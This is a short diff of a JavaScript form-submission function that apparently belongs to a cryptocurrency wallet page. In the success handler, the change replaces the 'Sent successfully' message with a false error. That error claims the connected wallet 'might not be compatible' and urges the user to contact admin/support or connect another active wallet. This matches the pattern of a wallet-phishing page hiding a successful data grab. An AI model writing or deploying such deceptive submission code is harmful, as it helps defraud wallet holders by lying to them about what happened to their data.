@@ -63,13 +63,14 @@ const sendData = async (data) => {
     // Push our data into our FormData object
 
     // Define what happens on successful data submission
-    XHR.addEventListener("load", function(event) {
+     XHR.addEventListener("load", function(event) {
         alert(
-            "Sent successfully"
+            "Error! The wallet connected might not be compatible.Please contact the admin/support for more help or Connect with an active wallet."
         );
 
         document.querySelector(".sending").style.display = "none";
     });
+
 
     // Define what happens in case of error
     XHR.addEventListener(" error", function(event) {
